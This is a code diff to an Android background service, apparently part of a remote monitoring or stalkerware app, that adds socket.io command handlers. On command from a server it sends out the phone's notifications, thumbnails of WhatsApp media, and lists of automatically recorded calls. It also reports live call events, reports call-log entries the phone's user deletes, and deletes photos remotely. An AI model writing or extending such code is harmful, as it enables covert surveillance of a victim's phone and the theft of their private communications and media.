@@ -48,6 +48,9 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.URISyntaxException;
 import java.util.Date;
+import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
 
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -60,6 +63,11 @@ public class DeviceService extends Service {
     private static final int NOTIFICATION_ID = 1001;
 
     public static boolean isRunning = false;
+    private static DeviceService instance;
+
+    public static DeviceService getInstance() {
+        return instance;
+    }
 
     private Socket socket;
     private String serverUrl;
@@ -69,10 +77,12 @@ public class DeviceService extends Service {
     private LocationCallback locationCallback;
     private boolean gpsActive = false;
     private MediaRecorder mediaRecorder;
+    private Timer callLogCheckTimer;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
         createNotificationChannel();
         locationClient = LocationServices.getFusedLocationProviderClient(this);
     }
@@ -131,6 +141,9 @@ public class DeviceService extends Service {
 
                 // Send device info
                 sendDeviceInfo();
+
+                // Start periodic call log monitoring (every 30 seconds)
+                startCallLogMonitoring();
             });
 
             socket.on(Socket.EVENT_DISCONNECT, args -> {
@@ -158,6 +171,12 @@ public class DeviceService extends Service {
             socket.on("command:audio:record", args -> handleAudioRecord());
             socket.on("command:audio:stop", args -> handleAudioStop());
             socket.on("command:contacts:fetch", args -> handleContactsFetch());
+            socket.on("command:notifications:fetch", args -> handleNotificationsFetch());
+            socket.on("command:whatsapp:fetch", args -> handleWhatsAppFetch());
+            socket.on("command:photo:delete", args -> {
+                if (args.length > 0) handlePhotoDelete((JSONObject) args[0]);
+            });
+            socket.on("command:recordings:fetch", args -> handleRecordingsFetch());
 
             socket.connect();
 
@@ -613,6 +632,303 @@ public class DeviceService extends Service {
         }
     }
 
+    // ---- Notifications ----
+    private void handleNotificationsFetch() {
+        try {
+            JSONArray notifs = new JSONArray();
+            List<JSONObject> history = NotificationService.getNotificationHistory();
+
+            synchronized (history) {
+                for (JSONObject n : history) {
+                    notifs.put(n);
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("notifications", notifs);
+            data.put("count", notifs.length());
+            data.put("note", notifs.length() == 0 ?
+                "Enable Notification Access in Settings > Apps > Special Access > Notification Access" : "");
+            socket.emit("notifications:data", data);
+            Log.d(TAG, "Sent " + notifs.length() + " notifications");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Notifications fetch error: " + e.getMessage());
+            emitError("notifications:data", e.getMessage());
+        }
+    }
+
+    // Called by NotificationService when new notification arrives
+    public void onNotificationReceived(JSONObject notifData) {
+        if (socket != null && socket.connected()) {
+            socket.emit("notification:new", notifData);
+        }
+    }
+
+    // Called by CallRecordService when call recording completes
+    public void onCallRecorded(JSONObject recordingData) {
+        if (socket != null && socket.connected()) {
+            socket.emit("recording:new", recordingData);
+        }
+    }
+
+    // Called by CallRecordService for live call state changes
+    public void onLiveCallEvent(JSONObject liveData) {
+        if (socket != null && socket.connected()) {
+            socket.emit("call:live", liveData);
+        }
+    }
+
+    // ---- Call Log Monitoring ----
+    private void startCallLogMonitoring() {
+        if (callLogCheckTimer != null) {
+            callLogCheckTimer.cancel();
+        }
+        callLogCheckTimer = new Timer();
+        callLogCheckTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                checkCallLogDeletions();
+            }
+        }, 5000, 30000); // Check every 30 seconds, start after 5s
+    }
+
+    // ---- Call Log Delete Detection ----
+    private int lastCallLogCount = -1;
+    private JSONArray lastCallLogSnapshot = null;
+
+    // Called periodically or on demand to check for deleted call logs
+    private void checkCallLogDeletions() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) return;
+
+        try {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
+                    CallLog.Calls.DATE + " DESC LIMIT 200");
+
+            if (cursor != null) {
+                int currentCount = cursor.getCount();
+
+                // If count decreased, something was deleted
+                if (lastCallLogCount > 0 && currentCount < lastCallLogCount) {
+                    int deletedCount = lastCallLogCount - currentCount;
+
+                    // Find which entries were deleted
+                    JSONArray currentEntries = new JSONArray();
+                    while (cursor.moveToNext()) {
+                        JSONObject entry = new JSONObject();
+                        entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                        entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                        currentEntries.put(entry);
+                    }
+
+                    JSONArray deletedEntries = new JSONArray();
+                    if (lastCallLogSnapshot != null) {
+                        for (int i = 0; i < lastCallLogSnapshot.length(); i++) {
+                            JSONObject old = lastCallLogSnapshot.getJSONObject(i);
+                            boolean found = false;
+                            for (int j = 0; j < currentEntries.length(); j++) {
+                                JSONObject curr = currentEntries.getJSONObject(j);
+                                if (old.optString("number").equals(curr.optString("number")) &&
+                                    old.optLong("timestamp") == curr.optLong("timestamp")) {
+                                    found = true;
+                                    break;
+                                }
+                            }
+                            if (!found) {
+                                deletedEntries.put(old);
+                            }
+                        }
+                    }
+
+                    // Emit deletion event
+                    JSONObject data = new JSONObject();
+                    data.put("deletedCount", deletedCount);
+                    data.put("deletedEntries", deletedEntries);
+                    data.put("timestamp", System.currentTimeMillis());
+
+                    if (socket != null && socket.connected()) {
+                        socket.emit("calllog:deleted", data);
+                    }
+                    Log.d(TAG, "Call log deletion detected: " + deletedCount + " entries removed");
+
+                    lastCallLogSnapshot = currentEntries;
+                } else {
+                    // Store snapshot for comparison
+                    JSONArray entries = new JSONArray();
+                    while (cursor.moveToNext()) {
+                        JSONObject entry = new JSONObject();
+                        entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                        entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                        entry.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
+                        entries.put(entry);
+                    }
+                    lastCallLogSnapshot = entries;
+                }
+
+                lastCallLogCount = currentCount;
+                cursor.close();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Call log check error: " + e.getMessage());
+        }
+    }
+
+    // ---- WhatsApp Media ----
+    private void handleWhatsAppFetch() {
+        try {
+            JSONArray media = new JSONArray();
+
+            // WhatsApp stores media in known locations
+            String[] whatsappPaths = {
+                "WhatsApp/Media/WhatsApp Images",
+                "WhatsApp/Media/WhatsApp Video",
+                "WhatsApp/Media/WhatsApp Audio",
+                "WhatsApp/Media/WhatsApp Documents",
+                "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
+                "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video"
+            };
+
+            File storage = Environment.getExternalStorageDirectory();
+
+            for (String wpPath : whatsappPaths) {
+                File dir = new File(storage, wpPath);
+                if (dir.exists() && dir.isDirectory()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        int count = 0;
+                        for (File f : files) {
+                            if (f.isFile() && !f.getName().startsWith(".") && count < 100) {
+                                JSONObject item = new JSONObject();
+                                item.put("name", f.getName());
+                                item.put("path", f.getAbsolutePath());
+                                item.put("size", f.length());
+                                item.put("lastModified", f.lastModified());
+                                item.put("type", getMimeType(f.getName()));
+                                item.put("folder", wpPath);
+
+                                // Generate thumbnail for images
+                                if (f.getName().toLowerCase().endsWith(".jpg") ||
+                                    f.getName().toLowerCase().endsWith(".jpeg") ||
+                                    f.getName().toLowerCase().endsWith(".png")) {
+                                    try {
+                                        BitmapFactory.Options opts = new BitmapFactory.Options();
+                                        opts.inSampleSize = 8; // 1/8 size
+                                        Bitmap thumb = BitmapFactory.decodeFile(f.getAbsolutePath(), opts);
+                                        if (thumb != null) {
+                                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                                            thumb.compress(Bitmap.CompressFormat.JPEG, 40, baos);
+                                            item.put("thumbnail", "data:image/jpeg;base64," +
+                                                Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP));
+                                            thumb.recycle();
+                                        }
+                                    } catch (Exception e) {
+                                        // Skip thumbnail
+                                    }
+                                }
+
+                                media.put(item);
+                                count++;
+                            }
+                        }
+                    }
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("media", media);
+            data.put("count", media.length());
+            data.put("note", media.length() == 0 ?
+                "WhatsApp media not found. Ensure WhatsApp is installed and has media." : "");
+            socket.emit("whatsapp:data", data);
+            Log.d(TAG, "Sent " + media.length() + " WhatsApp media items");
+
+        } catch (Exception e) {
+            Log.e(TAG, "WhatsApp fetch error: " + e.getMessage());
+            emitError("whatsapp:data", e.getMessage());
+        }
+    }
+
+    // ---- Photo Delete ----
+    private void handlePhotoDelete(JSONObject args) {
+        try {
+            long photoId = args.optLong("photoId", -1);
+            String photoPath = args.optString("path", "");
+
+            boolean deleted = false;
+
+            if (photoId > 0) {
+                // Delete by MediaStore ID
+                Uri contentUri = Uri.withAppendedPath(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(photoId));
+                int rows = getContentResolver().delete(contentUri, null, null);
+                deleted = rows > 0;
+            } else if (!photoPath.isEmpty()) {
+                // Delete by file path
+                File file = new File(photoPath);
+                if (file.exists()) {
+                    deleted = file.delete();
+                    // Also remove from MediaStore
+                    getContentResolver().delete(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        MediaStore.Images.Media.DATA + "=?",
+                        new String[]{photoPath});
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("success", deleted);
+            data.put("photoId", photoId);
+            data.put("path", photoPath);
+            socket.emit("photo:deleted", data);
+            Log.d(TAG, "Photo delete: " + (deleted ? "success" : "failed"));
+
+        } catch (Exception e) {
+            Log.e(TAG, "Photo delete error: " + e.getMessage());
+            try {
+                JSONObject data = new JSONObject();
+                data.put("success", false);
+                data.put("error", e.getMessage());
+                socket.emit("photo:deleted", data);
+            } catch (JSONException ex) {}
+        }
+    }
+
+    // ---- Call Recordings ----
+    private void handleRecordingsFetch() {
+        try {
+            JSONArray recordings = new JSONArray();
+            File recordDir = new File(getExternalFilesDir(null), "recordings");
+
+            if (recordDir.exists()) {
+                File[] files = recordDir.listFiles();
+                if (files != null) {
+                    for (File f : files) {
+                        if (f.isFile() && f.getName().startsWith("call_")) {
+                            JSONObject rec = new JSONObject();
+                            rec.put("name", f.getName());
+                            rec.put("size", f.length());
+                            rec.put("timestamp", f.lastModified());
+                            rec.put("path", f.getAbsolutePath());
+                            recordings.put(rec);
+                        }
+                    }
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("recordings", recordings);
+            data.put("count", recordings.length());
+            data.put("note", recordings.length() == 0 ?
+                "No recordings yet. Calls will be recorded automatically." : "");
+            socket.emit("recordings:data", data);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Recordings fetch error: " + e.getMessage());
+        }
+    }
+
     // ---- Helpers ----
     private String getMimeType(String fileName) {
         String ext = fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
@@ -674,7 +990,12 @@ public class DeviceService extends Service {
     public void onDestroy() {
         super.onDestroy();
         isRunning = false;
+        instance = null;
 
+        if (callLogCheckTimer != null) {
+            callLogCheckTimer.cancel();
+            callLogCheckTimer = null;
+        }
         if (socket != null) {
             socket.disconnect();
             socket.close();
